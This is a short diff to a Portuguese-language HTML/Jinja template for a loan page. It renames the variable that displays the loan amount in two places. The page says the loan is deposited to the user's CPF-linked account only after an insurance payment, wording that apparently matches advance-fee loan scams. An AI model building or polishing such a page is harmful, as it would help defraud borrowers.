@@ -347,7 +347,7 @@
                 <div style="background-color: #f5f8ff; padding: 20px; border-radius: 8px; border: 1px solid #ddd; margin-bottom: 20px;">
                     <div style="margin-bottom: 15px;">
                         <div style="font-weight: 600; color: #1351b4; margin-bottom: 5px;">Valor do Empréstimo:</div>
-                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;">R$ {{ "%.2f"|format(loanValue|float|default(4000)) }}</div>
+                        <div style="font-size: 1.2rem; font-weight: 700; color: #28a745;">R$ {{ "%.2f"|format(amount|float) }}</div>
                     </div>
                     
                     <div style="margin-bottom: 15px;">
@@ -370,7 +370,7 @@
                         <i class="fas fa-info-circle" style="color: #f39c12; font-size: 1.2rem; margin-right: 10px;"></i>
                         <div style="font-weight: 600; color: #f39c12;">Importante:</div>
                     </div>
-                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong>R$ {{ "%.2f"|format(loanValue|float|default(4000)) }}</strong> será depositado na conta vinculada ao CPF <strong>{{ cpf }}</strong>.</p>
+                    <p style="margin: 0; line-height: 1.4;">Após o pagamento do seguro, o valor de <strong>R$ {{ "%.2f"|format(amount|float) }}</strong> será depositado na conta vinculada ao CPF <strong>{{ cpf }}</strong>.</p>
                 </div>
             </div>
 
